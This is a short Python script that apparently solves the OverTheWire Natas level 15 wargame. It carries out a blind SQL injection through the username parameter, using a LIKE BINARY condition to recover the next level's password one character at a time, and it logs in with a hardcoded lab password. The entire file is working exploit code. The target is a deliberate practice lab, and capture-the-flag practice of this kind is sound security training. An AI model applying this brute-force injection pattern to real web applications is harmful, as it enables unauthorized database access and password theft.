#!/usr/bin/python

import requests

natas15_user = 'natas15'
natas15_pass = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

response_string_success = 'This user exists'

def make_post(test_pass):
    url = 'http://natas15.natas.labs.overthewire.org/?debug=true&username=natas16%22%20and%20password%20LIKE%20BINARY%20%22' + test_pass + '%'
    r = requests.get(url, auth=(natas15_user, natas15_pass))
    if r.content.find(response_string_success) != -1:
        return True
    return False

dictionary = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
current_pass = ''

for i in range(0, 64):
    for c in dictionary:
        test_pass = current_pass + c
        result = make_post(test_pass)
        if result:
            current_pass = test_pass
            print("Password detected so far: " + current_pass)
            break
print("Password found: " + current_pass)
